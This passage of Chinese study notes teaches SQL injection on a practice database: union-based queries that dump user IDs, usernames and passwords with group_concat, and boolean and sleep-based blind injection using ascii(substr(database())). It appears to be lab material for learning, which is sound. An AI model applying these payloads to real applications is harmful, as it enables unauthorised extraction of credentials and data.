# **<font style="color:rgb(38, 38, 38);">2.3.1.3 </font>**union联合注入
    5. 查询所有的内容来自`users`表，条件是id=1，联合查询`1,2,3`  
`select * from users where id = 1 union select 1,2,3;`  
![](https://cdn.nlark.com/yuque/0/2024/png/26698826/1714961320853-8eeee548-007d-43ce-a305-db170e437dd7.png)
    6. 当union之前的查询语句，查询结果为空，会将`1,2,3`放到第一行  
`select * from users where id = 0 union select 1,2,3;`  
![](https://cdn.nlark.com/yuque/0/2024/png/26698826/1714961492685-79bee07a-19c6-40f3-af8b-1b25eaa310fa.png)
    7. 使用别名进行查询  
`select u.id from users as u where id = 0  union select 1,2,3;`  
![](https://cdn.nlark.com/yuque/0/2024/png/26698826/1714964342470-55709872-ba6c-41a3-9e55-97956a5c0f44.png)  
`users as  u`代表给`users`取一个别名叫做`u`  
`u.id`代表`u`中的`id`字段
    8. 查询条件是`id<5`的数据  
`select u.id,u.username,u.password from users as u where id < 5  union select 1,2,3;`![](https://cdn.nlark.com/yuque/0/2024/png/26698826/1714964598548-c419ac78-2a9c-45fc-ba46-8bc99221388a.png)
    9. 使用`limit 0,3`进行截取,从第0行截取，取3行  
` select u.id,u.username,u.password from users as u where id < 5  union select 1,2,3 limit 0,3;`![](https://cdn.nlark.com/yuque/0/2024/png/26698826/1714965191825-07998ae6-b464-450e-9640-2f40373b7f40.png)
    10. 将多行数据整合为一行输出  
`select group_concat(u.id,'~',u.username,'~',u.password) from users as u where id < 5  union select 1`![](https://cdn.nlark.com/yuque/0/2024/png/26698826/1714964866191-33d59b4a-0f03-47b8-910e-56e02c0cf271.png)

# **<font style="color:rgb(38, 38, 38);">2.3.1.4 </font>**布尔注入和睡眠注入
    1. 查询security.users中条件id=1的数据  
`select * from security.users where id =1;`  
![](../../../../images/c96bceb5383bc823bc15c780b38dbe4c.png)
    2. 添加`and`进行判断  
`select * from security.users where id =1 and 1=1;`   正常查询  
`select * from security.users where id =1 and 1=2;`    异常但不是语法报错  
![](https://cdn.nlark.com/yuque/0/2024/png/26698826/1714967097532-0065399c-dbc6-47be-b6ad-4a76d7964c7e.png)
    3. 使用布尔进行判断  
`select * from security.users where id =1 and ascii(substr(database(),1,1))=115;`  
![](https://cdn.nlark.com/yuque/0/2024/png/26698826/1714972454262-c7b822d0-16b8-4335-abc7-274998223982.png)  
`ascii()`将字符转化为数字  
`substr(被截取的字符串,开始的位置,取一个字符)`
    4. 使用睡眠进行布尔判断  
`select * from security.users where id =1 and If(ascii(substr(database(),1,1))=115,1,sleep(5));`  
`select * from security.users where id =1 and If(ascii(substr(database(),1,1))=116,1,sleep(5));`![](https://cdn.nlark.com/yuque/0/2024/png/26698826/1714972715241-03e492f2-3a29-440e-b4e9-67fdc8f9117f.png)
